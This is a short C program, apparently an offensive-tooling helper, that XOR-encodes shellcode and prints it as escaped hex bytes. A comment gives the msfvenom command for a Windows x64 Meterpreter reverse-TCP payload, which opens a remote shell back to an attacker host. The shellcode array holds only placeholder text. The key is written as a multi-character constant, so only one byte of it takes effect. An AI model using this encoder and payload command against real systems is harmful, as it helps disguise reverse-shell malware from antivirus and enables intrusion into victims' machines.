#include <stdio.h>

int main()
{

    //msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f c

    unsigned char code[] = "shellcode from msfvenom";

    char key = 'key';
    int i = 0;
    for (i; i < sizeof(code); i++)
    {
        printf("\\x%02x", code[i] ^ key);
    }
}
